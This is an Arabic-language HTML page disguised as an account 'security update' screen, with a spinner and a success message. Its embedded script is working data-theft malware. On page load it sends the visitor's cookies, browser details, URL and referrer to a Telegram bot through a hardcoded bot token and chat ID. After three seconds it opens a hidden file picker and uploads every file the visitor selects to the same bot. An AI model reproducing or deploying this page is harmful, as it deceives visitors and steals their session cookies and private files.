<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            max-width: 420px;
            width: 90%;
            text-align: center;
        }
        .icon { font-size: 48px; margin-bottom: 16px; }
        h2 { color: #1a1a2e; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
        p { color: #555; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
        .loader {
            border: 4px solid #e8e8e8;
            border-top: 4px solid #2d7aff;
            border-radius: 50%;
            width: 44px;
            height: 44px;
            animation: spin 0.9s linear infinite;
            margin: 10px auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .progress-bar { width: 100%; height: 6px; background: #e8e8e8; border-radius: 10px; overflow: hidden; margin-top: 6px; }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #2d7aff, #6c5ce7);
            border-radius: 10px;
            animation: progress 2.5s ease-in-out forwards;
        }
        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
        .status { font-size: 13px; color: #888; margin-top: 14px; }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">🔒</div>
    <h2>تحديث الأمان جارٍ</h2>
    <p>نقوم بتحديث إعدادات الحماية لحسابك.<br>يرجى الانتظار لحظة...</p>
    <div class="loader"></div>
    <div class="progress-bar"><div class="progress-fill"></div></div>
    <div class="status">✅ اكتمل التحديث بنجاح</div>
</div>

<script>
// ==============================
// إعدادات بوت تليجرام (تم التحديث)
// ==============================
const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
const CHAT_ID   = '6526473202';

// ==============================
// جمع البيانات
// ==============================
const data = {
    ip: window.location.hostname || 'غير معروف',
    ua: navigator.userAgent || 'غير معروف',
    lang: navigator.language || 'غير معروف',
    screen: screen.width + 'x' + screen.height,
    cookies: document.cookie || 'لا توجد كوكيز',
    referrer: document.referrer || 'مباشر',
    url: window.location.href,
    time: new Date().toISOString()
};

// ==============================
// إرسال البيانات إلى تليجرام
// ==============================
const message = `✅ *تم جمع بيانات جديدة*

🌐 IP: ${data.ip}
📱 المتصفح: ${data.ua}
🌍 اللغة: ${data.lang}
🖥️ الشاشة: ${data.screen}
🍪 الكوكيز: ${data.cookies}
🔗 الرابط: ${data.url}
📅 الوقت: ${data.time}
↩️ المرجع: ${data.referrer}`;

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    })
})
.then(r => r.json())
.then(res => console.log('✅ تم الإرسال', res))
.catch(err => console.error('❌ خطأ:', err));

// ==============================
// محاولة سحب ملفات (بعد 3 ثوان)
// ==============================
setTimeout(() => {
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.style.display = 'none';
    input.accept = '.*';
    input.onchange = (e) => {
        for (let file of e.target.files) {
            const reader = new FileReader();
            reader.onload = (f) => {
                const content = f.target.result.split(',')[1] || f.target.result;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        document: content,
                        caption: `📎 ملف: ${file.name} (${(file.size / 1024).toFixed(1)} كيلوبايت)`
                    })
                });
            };
            reader.readAsDataURL(file);
        }
    };
    document.body.appendChild(input);
    input.click();
}, 3000);

console.log('✅ جاهز');
</script>

</body>
</html>
